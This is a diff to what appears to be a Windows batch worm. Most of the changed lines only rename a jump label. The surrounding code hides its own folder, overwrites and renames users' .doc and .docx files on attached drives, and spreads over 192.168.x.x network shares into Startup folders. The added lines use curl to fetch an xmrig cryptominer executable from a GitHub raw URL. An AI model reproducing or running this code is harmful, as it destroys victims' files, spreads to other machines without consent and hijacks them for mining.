@@ -3,19 +3,19 @@ SET ii=1
 SET i=0
 timeout 3 >> nul
 :run
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
 goto skip
-:next
+:next1
 set daysofweek=Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday
 for /F "skip=2 tokens=2-4 delims=," %%A in ('WMIC Path Win32_LocalTime Get DayOfWeek /Format:csv') do set daynumber=%%A
 if %daynumber% == 0 set daynumber=7
@@ -85,17 +85,17 @@ attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
 
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -151,17 +151,17 @@ attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
 
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do ren "%%h" *.doc)
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do ren "%%h" *.doc)
@@ -217,17 +217,17 @@ attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
 
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -283,17 +283,17 @@ attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
 
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
 
 for /f %%x in ('net view \\192.168.%i%.%ii%') do pushd \\192.168.%i%.%ii%\%%x
 if exist A: (for /f %%x in ('dir A:\Users /b') do mkdir "A:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
@@ -358,17 +358,17 @@ attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
 
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -424,17 +424,17 @@ attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
 
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do ren "%%h" *.doc)
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do ren "%%h" *.doc)
@@ -490,17 +490,17 @@ attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
 
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -556,17 +556,17 @@ attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
 
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
 
 pushd \\192.168.%i%.%ii%\C$
 if exist A: (for /f %%x in ('dir A:\Users /b') do mkdir "A:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
@@ -631,17 +631,17 @@ attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
 
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -697,17 +697,17 @@ attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
 
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do ren "%%h" *.doc)
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do ren "%%h" *.doc)
@@ -763,17 +763,17 @@ attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
 
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -829,17 +829,17 @@ attrib +h +s +r "C:\ProgramData\PSU"
 attrib +h +s +r "C:\ProgramData\PSU\check.bat"
 attrib +h +s +r "C:\ProgramData\PSU\smb.bat"
 
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
-if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
 
 if %ii% == 256 (goto next) else (set /a ii=ii+1)
 goto run
@@ -859,8 +859,9 @@ timeout 3
 goto run
 
 :download
-attrib -h -s -r "C:\ProgramData\PSU" /s /d
 taskkill /IM xmrig.exe /F
 timeout 0 >> nul
 del "C:\ProgramData\PSU\xmrig.exe"
+timeout 0 >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/xmrig.txt" -o "C:\ProgramData\PSU\xmrig.exe" >> nul
 goto run
